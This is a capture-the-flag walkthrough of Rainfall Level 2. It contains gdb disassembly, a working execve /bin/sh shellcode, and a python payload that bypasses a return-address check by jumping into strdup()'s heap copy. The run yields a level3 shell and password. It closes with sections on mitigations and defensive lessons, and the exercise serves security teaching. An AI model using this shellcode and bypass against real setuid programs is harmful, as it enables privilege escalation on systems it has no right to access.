# Level 2 Walkthrough

*Step-by-step solution for Rainfall Level 2 with detailed return address validation bypass and heap-based shellcode injection analysis*

## Initial Analysis

### 1. Examine the Binary
```bash
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile

level2@RainFall:~$ file level2
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x46834d5b88d04847b6615b8c8e1a0a64c9e4318a, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level3** user
- When executed, runs with **level3 privileges**

### 2. Test Basic Execution Behavior
```bash
level2@RainFall:~$ ./level2
hello
hello

level2@RainFall:~$ echo "test input" | ./level2
test input

level2@RainFall:~$ python -c 'print "A"*100' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

**Initial Pattern Discovery:**
- **Interactive program**: Reads input and echoes it back
- **Normal behavior**: Short input works fine, echoes and exits
- **Long input causes segfault**: Buffer overflow vulnerability confirmed
- **No visible validation**: Program accepts any input length initially

**Critical Discovery**: The segfault with long input confirms a buffer overflow, but the echo behavior suggests the program continues after input, unlike a simple buffer overflow crash.

## Reverse Engineering - Understanding the Control Flow

### 3. Function Analysis - Discovering the Program Structure
```bash
level2@RainFall:~$ gdb level2
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x080483a0  printf@plt
0x080483b0  fflush@plt      ← Output buffer flush
0x080483c0  gets@plt        ← Dangerous input function!
0x080483d0  _exit@plt       ← Program termination
0x080483e0  strdup@plt      ← String duplication + heap allocation
0x080483f0  puts@plt        ← String output
0x080484d4  p               ← Main logic function
0x0804853f  main            ← Entry point
```

**Function Analysis:**
- **gets@plt**: The dangerous unbounded input function
- **strdup@plt**: Allocates memory on heap and copies string
- **printf@plt and _exit@plt**: Suggests error handling
- **Single custom function p()**: Contains main program logic

### 4. Main Function Analysis
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>     # Call function p()
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
```

**Main Function Discovery:**
- **Simple wrapper**: Just calls function p() and returns
- **All logic in p()**: The vulnerability and exploitation target is in p()

### 5. Function p() Deep Analysis - The Security Check Discovery
```bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp        # 104 bytes local space
   
   # Flush output buffer
   0x080484da <+6>:     mov    0x8049860,%eax    # stdout
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   
   # Read user input - VULNERABLE!
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax  # Buffer at EBP-76
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>  # gets(buffer)
   
   # SECURITY CHECK - Return address validation!
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax    # Load return address
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)   # Store locally
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax   # Load stored address
   0x080484fb <+39>:    and    $0xb0000000,%eax  # Mask with 0xb0000000
   0x08048500 <+44>:    cmp    $0xb0000000,%eax  # Compare
   0x08048505 <+49>:    jne    0x8048527 <p+83>  # Jump if valid
```

**Critical Security Check Discovery:**
The program implements a **return address validation** mechanism!
- **Loads return address** from stack (EBP+4)
- **Masks with 0xb0000000** to check address range  
- **Compares with 0xb0000000** to detect stack addresses
- **Blocks stack-based exploitation** - traditional buffer overflow won't work!

### 6. Security Violation and Normal Paths
```bash
   # Security violation path (if return address looks like stack)
   0x08048507 <+51>:    mov    $0x8048620,%eax   # Error message
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx   # Corrupted address
   0x0804850f <+59>:    mov    %edx,0x4(%esp)    # Push address
   0x08048513 <+63>:    mov    %eax,(%esp)       # Push format
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>  # Print error
   0x0804851b <+71>:    movl   $0x1,(%esp)       # Exit code 1
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>   # Terminate
   
   # Normal execution path (if return address is valid)
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax  # Buffer address
   0x0804852a <+86>:    mov    %eax,(%esp)       
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>   # Echo input
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax  # Buffer address again
   0x08048535 <+97>:    mov    %eax,(%esp)       
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt> # Copy to heap!
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret                      # Return with overflow
```

**Control Flow Analysis:**
- **Security violation**: If return address starts with 0xb, print error and exit
- **Normal execution**: Echo input with puts(), then call strdup()
- **strdup() call**: Creates heap copy of our input - **KEY EXPLOITATION VECTOR!**

## Understanding the Security Mechanism

### 7. Return Address Validation Logic
```bash
# Let's understand what addresses are blocked:
(gdb) print/x 0xbfffffff & 0xb0000000
$1 = 0xb0000000  # Stack addresses BLOCKED

(gdb) print/x 0x08048000 & 0xb0000000  
$2 = 0x0        # Code section addresses ALLOWED

(gdb) print/x 0x0804a000 & 0xb0000000
$3 = 0x0        # Heap addresses ALLOWED
```

**Security Check Analysis:**
- **Stack addresses (0xbf000000-0xbfffffff)**: BLOCKED ❌
- **Heap addresses (0x08040000-0x0804ffff)**: ALLOWED ✅  
- **Code section (0x08048000-0x08049fff)**: ALLOWED ✅

**The Bypass Strategy Emerges:**
We can't use stack addresses, but we CAN use heap addresses! The strdup() call gives us a heap allocation with our controlled data.

### 8. Finding the Buffer Overflow Offset
```bash
level2@RainFall:~$ gdb level2
(gdb) run
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

# Analyzing the crash address
(gdb) print 0x37634136
$1 = 929251638
# This is "6Ac7" in little-endian

# Finding the position in our De Bruijn sequence
# "6Ac7" appears at position 80 in the pattern
```

**Offset Discovery:**
- **Buffer overflow offset**: 80 bytes
- **Return address location**: After 80 bytes of input
- **Crash confirmation**: Program tries to execute 0x37634136 ("6Ac7")

## Heap Address Discovery and Exploitation Strategy

### 9. Finding the Heap Allocation Address
```bash
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20) = 0
gets(0xbffff71c)  = 0xbffff71c
TEST
puts("TEST") = 5
strdup("TEST")  = 0x804a008
+++ exited (status 0) +++
```

**Heap Address Discovery:**
- **strdup() allocation**: Returns 0x804a008
- **Predictable address**: Heap allocations are consistent
- **Security check bypass**: 0x804a008 & 0xb0000000 = 0 ✅

**Exploitation Plan:**
1. **Place shellcode** at beginning of input
2. **Add padding** to reach return address (80 bytes total)  
3. **Overwrite return address** with heap address (0x804a008)
4. **strdup() copies shellcode** to heap at known address
5. **Function return** jumps to heap shellcode
6. **Shell execution** with elevated privileges

### 10. Crafting the Shellcode
```bash
# Compact shellcode for /bin/sh execution (21 bytes):
shellcode = (
    "\x6a\x0b"                    # push 0xb (execve syscall)
    "\x58"                        # pop eax
    "\x99"                        # cdq (clear edx)
    "\x52"                        # push edx (NULL terminator)
    "\x68\x2f\x2f\x73\x68"        # push "//sh"
    "\x68\x2f\x62\x69\x6e"        # push "/bin"
    "\x89\xe3"                    # mov ebx, esp ("/bin//sh")
    "\x31\xc9"                    # xor ecx, ecx (argv = NULL)
    "\xcd\x80"                    # int 0x80 (syscall)
)

# Shellcode breakdown:
# 1. Set up execve syscall number (11) in EAX
# 2. Clear EDX for environment pointer
# 3. Push "/bin//sh" string onto stack
# 4. Set EBX to point to filename
# 5. Clear ECX for argv pointer  
# 6. Execute system call
```

### 11. Payload Construction
```bash
# Payload structure:
# [21 bytes shellcode] + [59 bytes padding] + [4 bytes heap address]
# Total: 80 bytes to reach return address + 4 bytes return address

# Memory layout after gets():
# Buffer[0-20]:   Shellcode
# Buffer[21-79]:  Padding ("A" characters)
# Return address: 0x0804a008 (heap address where strdup copies our data)

# Creating the payload:
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/payload2
```

**Payload Logic:**
1. **Shellcode placement**: First 21 bytes contain our shell execution code
2. **Padding calculation**: 80 - 21 = 59 bytes needed to reach return address
3. **Return address**: 0x0804a008 in little-endian format (\x08\xa0\x04\x08)
4. **gets() overflow**: Corrupts return address on stack
5. **strdup() allocation**: Copies entire payload (including shellcode) to heap
6. **Function return**: Jumps to heap address, executes shellcode

## Exploitation Implementation

### 12. Testing the Exploit
```bash
level2@RainFall:~$ (cat /tmp/payload2; cat) | ./level2
# Program executes, processes input, calls strdup(), then returns...
$ whoami
level3
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

**Success!**
1. **gets() overflow**: 84-byte payload overflows buffer and corrupts return address
2. **Security check bypass**: Return address 0x0804a008 passes validation (not 0xb...)
3. **Normal execution**: puts() echoes input, strdup() copies to heap
4. **Heap shellcode**: strdup() places our shellcode at 0x0804a008
5. **Control transfer**: Function return jumps to heap address
6. **Shellcode execution**: /bin/sh spawned with level3 privileges

### 13. Understanding the Complete Execution Flow
```bash
# Step-by-step execution analysis:

1. p() function called, allocates 104-byte stack frame
2. fflush(stdout) ensures clean output
3. gets(buffer) reads 84 bytes:
   - Bytes 0-20: Shellcode
   - Bytes 21-79: Padding  
   - Bytes 80-83: Return address (0x0804a008)

4. Security check:
   - Loads corrupted return address: 0x0804a008
   - Masks: 0x0804a008 & 0xb0000000 = 0x00000000
   - Compares: 0x00000000 != 0xb0000000 ✓ (passes)

5. Normal execution path:
   - puts(buffer) outputs our input (shellcode + padding)
   - strdup(buffer) allocates heap memory at 0x0804a008
   - Copies entire 84-byte input to heap (including shellcode!)

6. Function return:
   - leave/ret instructions execute
   - ret loads corrupted return address: 0x0804a008  
   - CPU jumps to 0x0804a008 (heap memory)

7. Shellcode execution:
   - execve("/bin//sh", NULL, NULL) called
   - Shell spawned with setuid privileges
```

## Educational Analysis - Advanced Buffer Overflow Techniques

### 14. Return Address Validation Bypass

**Security Mechanism Analysis:**
- **Purpose**: Prevent stack-based code injection
- **Implementation**: Check return address against 0xb0000000 mask
- **Limitation**: Only blocks stack addresses, not heap/code sections

**Bypass Technique:**
- **Heap exploitation**: Use predictable heap allocations
- **Address space knowledge**: Understanding memory layout
- **strdup() abuse**: Legitimate function used for malicious code placement

### 15. Heap vs Stack Exploitation

**Traditional Stack Exploitation:**
- **Shellcode on stack**: Place code in buffer, jump to buffer address
- **Blocked here**: Security check prevents stack addresses
- **Limitation**: Return address validation makes this impossible

**Heap-Based Alternative:**
- **Shellcode on heap**: Use strdup() to place code in heap
- **Predictable addresses**: Heap allocations at known locations  
- **Security bypass**: Heap addresses allowed by validation
- **More complex**: Requires understanding of heap allocation patterns

### 16. Modern Protections and Bypasses

**Why This Attack Works:**
- **No DEP/NX**: Heap memory is executable
- **Predictable ASLR**: Heap addresses consistent across runs
- **Partial validation**: Security check has logical gaps
- **Dangerous functions**: gets() provides unlimited overflow

**Modern Mitigations:**
- **DEP/NX bit**: Makes heap non-executable
- **ASLR**: Randomizes heap addresses
- **Stack canaries**: Detect stack corruption
- **Fortified functions**: Replace gets() with bounds-checked alternatives
- **Control Flow Integrity**: Validates return addresses more thoroughly

### 17. Real-World Implications

**Attack Sophistication:**
- **Security evasion**: Understanding and bypassing protection mechanisms
- **Memory layout exploitation**: Leveraging predictable allocations
- **Function chaining**: Using legitimate functions for malicious purposes
- **Multi-stage exploitation**: Overflow → validation bypass → code execution

**Similar Real-World Scenarios:**
- **Browser exploits**: Heap spraying to place shellcode
- **Application security**: Partial input validation bypass
- **Embedded systems**: Limited security mechanisms with exploitable gaps
- **Legacy software**: Incomplete security retrofitting

## Vulnerability Analysis Summary

### Root Cause:
- **Dangerous input function**: gets() provides unlimited buffer overflow capability
- **Incomplete security check**: Return address validation only blocks stack addresses
- **Predictable heap allocation**: strdup() creates exploitable memory layout
- **Executable heap**: No memory protection prevents code execution

### Exploitation Technique:
1. **Security mechanism analysis**: Understanding return address validation logic
2. **Address space mapping**: Identifying allowed vs blocked memory regions
3. **Buffer overflow calculation**: Precise offset measurement (80 bytes)
4. **Heap address discovery**: Finding predictable strdup() allocation address
5. **Shellcode injection**: Crafting compact executable payload (21 bytes)
6. **Validation bypass**: Using heap address to circumvent security check
7. **Control flow redirection**: Overwriting return address for shellcode execution
8. **Privilege escalation**: Shell execution with setuid binary privileges

### Key Learning Points:
1. **Partial security measures can be systematically bypassed** with sufficient analysis
2. **Heap exploitation provides alternative to blocked stack attacks**
3. **Legitimate functions like strdup() can be weaponized** for code injection
4. **Memory layout understanding is crucial** for advanced exploitation
5. **Security checks must be comprehensive** to be effective
6. **Defense in depth is essential** - single protections are often insufficient

This level demonstrates **return address validation bypass through heap exploitation** - an advanced technique that circumvents stack-based protections by leveraging heap allocation patterns and predictable memory layouts to achieve code execution through alternative attack vectors when direct approaches are blocked.